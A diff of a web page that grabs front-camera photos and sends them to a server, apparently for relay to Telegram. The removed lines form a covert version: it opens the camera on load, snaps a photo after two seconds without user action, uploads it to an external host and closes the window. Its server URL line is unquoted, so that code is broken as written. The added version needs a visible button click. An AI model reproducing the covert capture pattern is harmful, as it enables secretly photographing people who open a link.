@@ -1,84 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera</title>
-    <style>
-        body { margin: 0; background: #000; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        #status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); color: white; font-family: sans-serif; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Vivo Y400 Front Cam Capture</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; background: #f5f5f5; }
+    #video { width: 320px; height: 240px; background: #000; }
+    #captureBtn { margin-top: 10px; padding: 10px 20px; font-size: 16px; }
+    #status { margin-top: 10px; font-weight: bold; }
+  </style>
 </head>
 <body>
+  <h1>Vivo Y400 Front Cam Capture</h1>
+  <video id="video" autoplay playsinline></video><br/>
+  <button id="captureBtn">Capture & Send to Telegram</button>
+  <div id="status"></div>
 
-<video id="video" autoplay playsinline></video>
-<div id="status">Initializing...</div>
-<canvas id="canvas" style="display:none;"></canvas>
-
-<script>
-    // Niche wale URL ko apne Render Deployed URL se replace karein (Step 4 mein milega)
-    const SERVER_URL = https://goodmorning-h59w.onrender.com
+  <script>
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('captureBtn');
     const status = document.getElementById('status');
 
-    async function start() {
-        try {
-            // Front Camera Open Karein
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                status.innerText = "Clicking Photo...";
-                
-                // 2 Second baad photo click karein
-                setTimeout(() => {
-                    captureAndSend();
-                }, 2000);
-            };
-        } catch (err) {
-            status.innerText = "Camera Error: " + err.message;
+    // Get camera stream
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { console.error(err); status.textContent = 'Camera access denied'; });
+
+    captureBtn.onclick = async () => {
+      status.textContent = 'Capturing...';
+
+      // Capture frame
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert to JPEG Base64
+      const dataURL = canvas.toDataURL('image/jpeg');
+
+      try {
+        const response = await fetch('/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ imageData: dataURL })
+        });
+
+        const result = await response.json();
+        if (result.success) {
+          status.textContent = '✅ Photo sent!';
+        } else {
+          status.textContent = '❌ ' + result.error;
         }
-    }
-
-    async function captureAndSend() {
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-        
-        // Image ko Base64 string mein convert karein
-        const dataURL = canvas.toDataURL('image/jpeg');
-
-        status.innerText = "Uploading to Telegram...";
-
-        try {
-            // Server par bhejein
-            const response = await fetch(`${SERVER_URL}/receive-image`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ imageData: dataURL })
-            });
-            
-            const result = await response.json();
-            if(result.success) {
-                status.innerText = "Sent!";
-                // Thoda ruk kar page refresh karein ya band ho jaye
-                setTimeout(() => window.close(), 1000);
-            } else {
-                status.innerText = "Upload Failed";
-            }
-        } catch (error) {
-            console.error(error);
-            status.innerText = "Network Error";
-        }
-    }
-
-    start();
-</script>
+      } catch (err) {
+        console.error(err);
+        status.textContent = '❌ Network error';
+      }
+    };
+  </script>
 </body>
 </html>
